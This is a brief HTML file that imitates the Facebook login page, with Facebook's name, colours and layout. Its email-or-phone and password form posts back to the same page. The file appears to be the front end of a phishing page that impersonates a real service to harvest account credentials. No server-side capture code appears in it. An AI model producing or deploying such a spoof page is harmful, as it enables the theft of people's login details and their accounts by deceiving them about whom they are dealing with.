<!DOCTYPE html>
<html>
<head><title>Facebook Login</title></head>
<body style="background:#e9ebee;">
<div style="width:400px; margin:150px auto; background:white; padding:30px; border-radius:8px;">
    <h2>Facebook</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Email or Phone" style="width:100%; padding:10px; margin:10px 0;" required>
        <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin:10px 0;" required>
        <button type="submit" style="width:100%; background:#1877f2; color:white; border:none; padding:10px;">Log In</button>
    </form>
</div>
</body>
</html>
